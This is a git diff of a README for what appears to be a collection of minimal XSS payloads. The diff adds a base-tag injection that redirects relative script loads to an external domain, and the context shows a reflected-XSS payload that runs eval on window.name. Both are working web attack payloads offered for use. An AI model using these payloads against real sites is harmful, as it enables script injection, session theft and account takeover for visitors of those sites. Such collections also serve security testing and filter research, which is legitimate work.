@@ -5,6 +5,13 @@ The DEMO available here: <https://tinyxss.terjanq.me>
 
 
 ## Current Payloads
+
+```html
+<!-- Requires a relative script inserted to the DOM after the sink, 
+  e.g. <base/href=//Ǌ.₨> ... <script src=/aaa></script> -->
+<base/href=//Ǌ.₨>
+```
+
 ```html
 <!-- Only works as reflected XSS -->
 <svg/onload=eval(name)>
